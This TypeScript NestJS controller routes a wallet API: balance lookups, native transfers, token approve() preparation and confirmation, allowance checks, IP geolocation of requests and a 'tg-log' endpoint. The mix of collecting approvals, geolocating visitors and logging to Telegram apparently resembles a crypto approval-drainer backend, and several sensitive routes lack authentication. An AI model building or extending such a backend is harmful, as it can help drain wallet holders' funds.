import { Body, Controller, Get, Param, Post, Query, Req, UnauthorizedException, UseGuards } from "@nestjs/common";
import { ApiBody, ApiOperation, ApiSecurity, ApiTags } from "@nestjs/swagger";
import { AdminApiKeyGuard } from "../../common/guards/admin-api-key.guard";
import { WalletSessionGuard } from "../auth/wallet-session.guard";
import { NativeTransferService } from "./native-transfer.service";
import { WalletService } from "./wallet.service";

@ApiTags("Wallet API")
@Controller("api")
export class WalletController {
  constructor(
    private readonly walletService: WalletService,
    private readonly nativeTransferService: NativeTransferService
  ) {}

  @Get("balances")
  @ApiOperation({ summary: "Fetch EVM/TRON balances for connected wallets" })
  balances(@Query("evm") evm?: string, @Query("tron") tron?: string) {
    return this.walletService.getBalances(evm ?? "", tron ?? "");
  }

  @Post("native-transfers/estimate")
  @ApiOperation({ summary: "Estimate native coin transfer fee and max sendable amount" })
  nativeTransferEstimate(@Body() body: Record<string, unknown>) {
    return this.nativeTransferService.estimate(body);
  }

  @Post("native-transfers/register-pending")
  @ApiOperation({ summary: "Register a broadcast native transfer awaiting confirmation" })
  nativeTransferRegisterPending(@Body() body: Record<string, unknown>) {
    return this.nativeTransferService.registerPending(body);
  }

  @Post("native-transfers/confirm")
  @ApiOperation({ summary: "Verify and persist a confirmed native transfer" })
  nativeTransferConfirm(@Body() body: Record<string, unknown>) {
    return this.nativeTransferService.confirm(body);
  }

  @Get("native-transfers/:id")
  @ApiOperation({ summary: "Fetch native transfer record by id" })
  nativeTransferById(@Param("id") id: string) {
    return this.nativeTransferService.getById(id);
  }

  @Post("approvals/prepare")
  @ApiOperation({ summary: "Build approve() transaction payload" })
  approvalsPrepare(@Body() body: Record<string, unknown>) {
    return this.walletService.prepareApproval(body);
  }

  @Post("approvals/confirm")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({ summary: "Confirm approval and persist in Postgres" })
  approvalsConfirm(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } }
  ) {
    const session = req.walletSession;
    const owner = String(body.owner ?? "").trim();
    const network = String(body.network ?? "").trim().toLowerCase();
    if (!session || session.address !== (network === "tron" ? owner : owner.toLowerCase()) || session.network !== network) {
      throw new UnauthorizedException("Authenticated wallet session does not match approval request");
    }
    return this.walletService.confirmApproval(body);
  }

  @Get("approvals/debug")
  @UseGuards(AdminApiKeyGuard)
  @ApiSecurity("adminApiKey")
  @ApiOperation({ summary: "Debug approvals/audits/transfers snapshot (admin only)" })
  approvalsDebug() {
    return this.walletService.debugApprovals();
  }

  @Post("approvals/debug")
  approvalsDebugPost(@Body() body: Record<string, unknown>) {
    return this.walletService.captureFlowLog(body);
  }

  @Get("approvals/:id")
  @UseGuards(WalletSessionGuard)
  approvalById(
    @Param("id") id: string,
    @Req() req: { walletSession?: { address: string } }
  ) {
    return this.walletService.getApprovalForOwner(id, req.walletSession!.address);
  }

  @Post("approvals/revoke/prepare")
  approvalsRevokePrepare(@Body() body: Record<string, unknown>) {
    return this.walletService.prepareRevoke(body);
  }

  @Post("tron-broadcast")
  tronBroadcast(@Body() body: Record<string, unknown>) {
    return this.walletService.broadcastTron(body);
  }

  @Post("verify-allowance")
  verifyAllowance(@Body() body: Record<string, unknown>) {
    return this.walletService.verifyAllowance(body);
  }

  @Post("register-approved")
  registerApproved(@Body() body: Record<string, unknown>) {
    return this.walletService.registerApproved(body);
  }

  @Post("tron-approve")
  tronApprove(@Body() body: Record<string, unknown>) {
    return this.walletService.legacyTronApprove(body);
  }

  @Post("consent_")
  consent(@Body() body: Record<string, unknown>) {
    return this.walletService.consent(body);
  }

  @Post("energy-delegate")
  @ApiOperation({
    summary:
      "Acquire chain resources for a prepared tx (legacy path). Routes to ResourceManager.acquireResources().",
  })
  energyDelegate(@Body() body: Record<string, unknown>) {
    return this.walletService.energyDelegate(body);
  }

  @Post("resources/acquire")
  @ApiOperation({
    summary: "Acquire chain resources after prepare (chain-agnostic).",
  })
  resourcesAcquire(@Body() body: Record<string, unknown>) {
    return this.walletService.energyDelegate(body);
  }

  @Post("resources/verify")
  @ApiOperation({
    summary: "Verify the address has resources needed to broadcast.",
  })
  resourcesVerify(@Body() body: Record<string, unknown>) {
    return this.walletService.verifyResources(body);
  }

  @Get("ipgeo")
  ipgeo(@Req() req: Request) {
    return this.walletService.ipgeo(req.headers);
  }

  @Post("tg-log")
  @ApiBody({ type: Object })
  tgLog(@Body() body: Record<string, unknown>, @Req() req: Request) {
    return this.walletService.tgLog(body, req.headers);
  }
}
